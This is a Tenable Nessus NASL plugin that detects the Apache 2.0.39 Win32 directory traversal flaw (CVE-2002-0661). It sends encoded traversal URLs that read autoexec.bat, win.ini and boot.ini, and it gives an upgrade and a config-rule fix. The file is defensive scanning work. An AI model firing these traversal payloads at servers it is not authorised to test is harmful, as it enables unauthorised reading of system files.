#
# (C) Tenable Network Security, Inc.
#

# Reference
# From:"Auriemma Luigi" <aluigi@pivx.com>
# To:bugtraq@securityfocus.com
# Subject: Apache 2.0.39 directory traversal and path disclosure bug
# Date: Fri, 16 Aug 2002 17:01:29 +0000


include("compat.inc");

if(description)
{
 script_id(11092);
 script_version("$Revision: 1.34 $");
 script_cve_id("CVE-2002-0661");
 script_bugtraq_id(5434);
 script_osvdb_id(859);

 script_name(english:"Apache <= 2.0.39 Win32 Crafted Traversal Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"It is possible to execute code on the remote host." );
 script_set_attribute(attribute:"description", value:
"A security vulnerability in Apache 2.0.39 on Windows systems allows
attackers to access files that would otherwise be inaccessible using a
directory traversal attack. 

An attacker could use this to read sensitive files or potentially execute any
command on your system." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Apache 2.0.40 or later. Alternatively, add the following in
your httpd.conf file, before the first 'Alias' or 'Redirect'
directive :

	RedirectMatch 400 \\\.\." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2002/08/18");
 script_set_attribute(attribute:"vuln_publication_date", value: "2002/08/16");
 script_cvs_date("$Date: 2015/08/04 20:57:14 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:apache:http_server");
script_end_attributes();

 
 summary["english"] = "Apache 2.0.39 Win32 directory traversal";
 
 script_summary(english:summary["english"]);
 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2002-2015 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/apache");
 exit(0);
}

# 
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);

banner = get_http_banner(port:port);
if ( "Apache" >!< banner ) exit(0);

cginameandpath[0] = "/error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cautoexec.bat";
cginameandpath[1] = "/error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini";
cginameandpath[2] = "/error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini";
cginameandpath[3] = "";

for (i = 0; cginameandpath[i]; i = i + 1)
{ 
  u = cginameandpath[i];
  if(check_win_dir_trav(port: port, url:u))
  {
    security_hole(port);
    exit(0);
  }
}

